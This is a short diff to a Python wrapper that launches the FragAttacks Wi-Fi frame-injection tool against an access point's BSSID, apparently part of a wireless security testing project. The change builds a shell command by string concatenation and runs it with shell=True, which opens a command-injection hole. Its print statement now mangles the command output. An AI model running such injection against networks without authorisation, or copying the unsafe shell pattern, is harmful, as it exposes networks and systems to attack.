@@ -59,9 +59,10 @@ def lancer_fragattack(bssid):
             if os.path.isfile(build_sh_path):
                 print(f"Exécution de fragattack dans {research_dir}")
                 os.chdir(research_dir)
-                command_fragattack = ['python', 'fragattack.py', '--inject', '1', '--ap', bssid, 'iface0', os.path.join(fileWireshark_dir, 'captureDatagramme-01.cap')]
+                # command_fragattack = ['python', 'fragattack.py', '--inject', '1', '--ap', bssid, '--full-reconnect', 'ping', 'I,E,R,E', 'wlan0', '/root/PycharmProjects/fragAttacks/services/captureDatagramme-01.cap']
+                command_fragattack = 'python fragattack.py --inject 1 --ap ' + bssid + ' --full-reconnect ping I,F,BE,E wlan0 /root/PycharmProjects/fragAttacks/services/captureDatagramme-01.cap'
                 print("Commande fragattack :", " ".join(command_fragattack))
-                subprocess.Popen(command_fragattack)
+                subprocess.run(command_fragattack, shell=True)
                 break
 
 
